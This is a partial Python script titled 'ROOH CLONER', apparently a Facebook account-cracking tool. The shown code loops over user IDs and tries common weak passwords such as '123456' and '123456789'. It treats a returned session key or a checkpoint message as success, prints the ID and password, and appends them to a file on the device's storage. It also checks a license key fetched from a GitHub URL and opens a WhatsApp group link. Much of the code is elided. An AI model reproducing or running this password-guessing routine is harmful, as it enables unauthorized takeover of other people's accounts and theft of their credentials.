#!/usr/bin/env python3
# ROOH CLONER â€“ SIR ROOHULAMIN EDITION
...
def open_whatsapp():
    link = WHATSAPP_LINK
    print("\033[1;33mðŸ“² Opening: \033[1;37m" + link + "\033[0m")
    try:
        subprocess.run(['xdg-open', link], check=True, timeout=5)
        print("\033[1;32mâœ… Group opened in your browser\033[0m")
    except (FileNotFoundError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
        try:
            subprocess.run(['termux-open', link], check=True, timeout=5)
            print("\033[1;32mâœ… Group opened\033[0m")
        except:
            print("\033[1;31mâŒ Could not open automatically.\033[0m")
            print("\033[1;33mPlease manually open this link:\033[0m")
...
def check_approval(key):
    url = "https://raw.githubusercontent.com/cadetrooh/roohkey/refs/heads/main/keys.txt"
    try:
    ...
    try:
        ...
        for pw in ('123456','1234567','12345678','123456789'):
            ...
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196mâ”œÐ§\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mROOH\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/ROOH-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mROOH-M1ðŸ‘¿\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/ROOH-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
